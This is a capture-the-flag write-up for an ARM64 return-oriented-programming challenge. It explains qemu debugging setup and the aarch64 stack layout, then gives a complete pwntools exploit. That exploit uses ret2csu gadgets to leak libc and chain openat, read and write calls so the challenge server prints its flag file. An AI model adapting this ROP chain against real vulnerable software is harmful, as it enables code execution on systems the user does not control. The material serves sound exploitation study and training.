# generic-rop-challenge

<div class="hidden">
    keywords: ARM64, aarch46, ROP, ret2csu
</div>

> [!WARNING]
> Not sure why the exploit does not work in non-debug mode locally, but works for local debug-mode and remote non-debug

## aarch64 (ARM64)

### Tools

References: <https://docs.pwntools.com/en/stable/qemu.html>

Debugging (**choose either one**):

- gdb-multiarch: `sudo apt-get install gdb-multiarch`
- gcc toolchain (with gdb): <https://github.com/xpack-dev-tools/aarch64-none-elf-gcc-xpack/>

Running:

- qemu: `sudo apt-get install qemu-user-static`
- libs: `sudo apt-get install libc6-arm64-cross` installs to `/usr/aarch64-linux-gnu/`

Running the binary

```sh
# non-debug mode
qemu-aarch64-static ./binary

# debug mode (gdbserver) on port 1234
qemu-aarch64-static -g 1234 ./binary

# in case of the loader not provided (`ld-linux-aarch64.so.1`), use the loader from `libc-arm64-cross`
qemu-aarch64-static -L /usr/aarch64-linux-gnu/ ./binary
```

Attach debugger with `GEF`

```sh
gef➤  gef-remote --qemu-user localhost 1234
```


### Assembly

References: <http://blog.perfect.blue/ROPing-on-Aarch64>

#### Registers

- `x0` to `x7` are used to pass arguments
- `x29` is equivalent to `rbp` in `x86`
- `x30` stores return address

#### Function Prologue

Pre-indexed performs the offset operation then the assembly instruction:

- Add `N` to `sp` (`sp = sp + N`)
- Stores old frame pointer, `x29`, to `[sp]` and return address, `x30`, to `[sp + 8]`

```armasm
stp x29, x30, [sp, #N]!  ; pre-indexed [base, #offset]!
mov x29, sp
```

#### Function Epilogue

Post-indexed performs the assembly instruction then the offset operation

- Load `[sp]` to `x29` and `[sp + 8]` to `x30`
- Add `N` to `sp` (`sp = sp + N`)

```armasm
ldp x29, x30, [sp], #N  ; post-indexed [base], #offset
```

#### Stack Layout

```text
+--------------------------+ ^ Lower memory address
| callee's saved x29       | |
+--------------------------+ |
| callee's saved x30       | |
+--------------------------+ | Stack growth direction
| callee's local variables |
+--------------------------+
| caller's saved x29       |
+--------------------------+
| caller's saved x30       |
+--------------------------+
| caller's local variables |
+--------------------------+   Higher memory address
```

Unlike in `x86` where saved `rbp` and `rip` are below the local variables which allow us to overwrite the saved `rip` and immediately return to our desired address,
in `ARM64` we overwrite the callers's return address instead due to the stack layout which means that we would first return normally to the caller and only then return to our desired address

## Solution

```py
#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

ld = ELF("./ld-linux-aarch64.so.1")
libc = ELF("./libc.so.6")
elf = context.binary = ELF("./vuln")


def start(argv=[], *a, **kw):
    global flag_path
    host = args.HOST or 'generic-rop-challenge.chal.imaginaryctf.org'
    port = int(args.PORT or 42042)
    if args.REMOTE:
        flag_path = b"/home/user/flag.txt\x00"
        return remote(host, port)
    if args.GDB:
        flag_path = b"/run/shm/flag.txt\x00"
        return process([qemu, "-g", str(debug_port), elf.path])
    else:
        flag_path = b"/run/shm/flag.txt\x00"
        return process([qemu, elf.path] + argv, env=env, *a, **kw)


env = {}
qemu = "/usr/bin/qemu-aarch64-static"
debug_port = 1234
flag_path = b""
io = start()

pad = 80 - 0x10
main_x29 = b"BBBBBBBB"
bss = elf.bss(0x200)

csu_1 = 0x400948
csu_2 = 0x400928


def ret2csu(w0, x1, x2, func_ptr, next_gadget):
    payload = b"A" * pad + main_x29 + p64(csu_1)
    payload += flat(bss, p64(csu_2))
    payload += flat(0, 1)  # x19, x20
    payload += flat(func_ptr, w0)  # x21, x22
    payload += flat(x1, x2)  # x23, x24
    payload += flat(bss, next_gadget)
    return payload


# Leak LIBC
payload = ret2csu(elf.got["puts"], 0, 0, elf.got["puts"], elf.symbols["main"])
io.sendlineafter(b"below\n", payload)
leak_puts = u64(io.recvline(keepends=False).ljust(8, b"\x00"))
if not args.REMOTE:
    leak_puts |= 0x4000000000
log.info(f"{leak_puts=:#x}")

libc.address = leak_puts - libc.symbols["puts"]
log.info(f"{libc.address=:#x}")

# gets(bss) // stdin: /home/user/flag.txt
pause()
log.info(f"setup flag path string @ bss + 0x500")
log.info(f"{flag_path=}")
flag_path_addr = elf.bss(0x500)
payload = ret2csu(flag_path_addr, 0, 0, elf.got["gets"], elf.symbols["main"])
io.sendlineafter(b"below\n", payload)
io.sendline(flag_path)  # absolute path to ignore `dirfd` for `openat`

# gets(bss) // stdin: libc.symbols["openat"]
openat_fptr = elf.bss(0x600)
log.info(f"setup openat function pointer @ bss + 0x600")
payload = ret2csu(openat_fptr, 0, 0, elf.got["gets"], elf.symbols["main"])
io.sendlineafter(b"below\n", payload)
io.sendline(p64(libc.symbols["openat"]))

# fini_ptr = 0x400e20

# openat(0, flag_path_addr, 0)
log.info(f"openat(0, flag_path_addr, 0)")
payload = ret2csu(0, flag_path_addr, 0, openat_fptr, elf.symbols["main"])
io.sendlineafter(b"below\n", payload)

# gets(bss) // stdin: libc.symbols["read"]
read_fptr = elf.bss(0x600)
log.info(f"setup read function pointer @ bss + 0x600")
payload = ret2csu(read_fptr, 0, 0, elf.got["gets"], elf.symbols["main"])
io.sendlineafter(b"below\n", payload)
io.sendline(p64(libc.symbols["read"]))

# read(5, flag_addr, 0x100)
flag_addr = elf.bss(0x700)
log.info(f"read(5, flag_addr, 0x100)")  # trial-and-error to find the proper fd
payload = ret2csu(5, flag_addr, 0x100, read_fptr, elf.symbols["main"])
io.sendlineafter(b"below\n", payload)

# gets(bss) // stdin: libc.symbols["write"]
write_fptr = elf.bss(0x600)
log.info(f"setup write function pointer @ bss + 0x600")
payload = ret2csu(write_fptr, 0, 0, elf.got["gets"], elf.symbols["main"])
io.sendlineafter(b"below\n", payload)
io.sendline(p64(libc.symbols["write"]))

# write(1, flag_addr, 0x100)
payload = ret2csu(1, flag_addr, 0x100, write_fptr, elf.symbols["main"])
io.sendlineafter(b"below\n", payload)

io.interactive()
```
